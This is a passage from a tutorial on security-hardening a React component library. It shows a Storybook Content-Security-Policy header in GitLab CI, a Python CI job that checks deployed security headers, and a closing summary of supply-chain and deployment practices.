        Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; frame-ancestors 'none'
      EOF
  artifacts:
    paths:
      - storybook-static/
  only:
    - main
```

**Vercel** uses a `vercel.json` configuration file with similar structure but different syntax. **Cloudflare Pages** supports the `_headers` file format like Netlify. All three platforms provide superior security header support compared to GitLab Pages.

### Testing security header implementation

After deploying your Storybook with security headers, verify the configuration using SecurityHeaders.com. This tool scans your site and provides an A-F grade based on header presence and configuration. Aim for an A rating-anything lower indicates missing or misconfigured headers.

Additionally, Mozilla Observatory provides comprehensive security assessment including TLS configuration, subresource integrity, and header analysis. These automated tools catch configuration mistakes before security auditors or users discover them.

Create an automated test in your CI pipeline that verifies headers are present after deployment:

```yaml
test-security-headers:
  stage: test
  image: python:3.11
  script:
    - pip install requests
    - |
      python << 'EOF'
      import requests
      import sys
      
      url = "https://your-storybook-site.netlify.app"
      response = requests.get(url)
      headers = response.headers
      
      required = {
          'strict-transport-security': 'HSTS',
          'x-frame-options': 'X-Frame-Options',
          'x-content-type-options': 'X-Content-Type-Options',
          'content-security-policy': 'CSP'
      }
      
      missing = []
      for header, name in required.items():
          if header not in headers:
              missing.append(name)
      
      if missing:
          print(f"❌ Missing headers: {', '.join(missing)}")
          sys.exit(1)
      else:
          print("✅ All required security headers present")
          for header in required.keys():
              print(f"  {header}: {headers[header][:50]}...")
      EOF
  only:
    - main
  dependencies: []
```

This test runs after deployment and fails the pipeline if critical headers are missing, ensuring security regressions are caught immediately.

## Bringing it all together

Security hardening transforms your React 19 component library from merely functional to trustworthy. By implementing strict CSP compliance through Vanilla Extract's build-time CSS extraction, you ensure consuming applications never need to weaken their security policies. By preventing XSS through DOMPurify sanitization and enforcing secure link practices, you protect users of applications built with your components. By hardening your supply chain with provenance, dependency auditing, and automated updates, you defend against increasingly sophisticated attacks on the npm ecosystem. By securing your CI/CD pipeline and deployment with proper secrets management and security headers, you demonstrate security expertise to potential users.

These practices compound. CSP compliance prevents injection attacks. XSS protection provides defense in depth. Supply chain security prevents compromises before they reach users. CI/CD security ensures only authorized, verified code is published. Deployment security protects visitors to your documentation. Together, they create a security posture that sets your library apart in an ecosystem where security is too often an afterthought.

Implement these practices incrementally. Start with the highest-impact changes: verify your Vanilla Extract configuration ensures static CSS extraction, add DOMPurify sanitization to any HTML rendering, enable npm provenance in your CI pipeline, and configure security headers on your Storybook deployment. Then expand: integrate audit-ci into your pipeline, configure Renovate for automated updates, protect your GitLab branches and tags, and enforce ESLint security rules. Document each security feature in your README so consumers understand what makes your library secure.

Security is not a destination but a continuous practice. Dependencies require ongoing updates. New vulnerabilities are discovered daily. Attack techniques evolve constantly. Schedule quarterly security reviews to audit dependencies, rotate tokens, update security policies, and assess emerging threats. Make security part of your development culture, not a checkbox to complete once. Your library's users trust you with their application security-honor that trust through rigorous, ongoing security practices.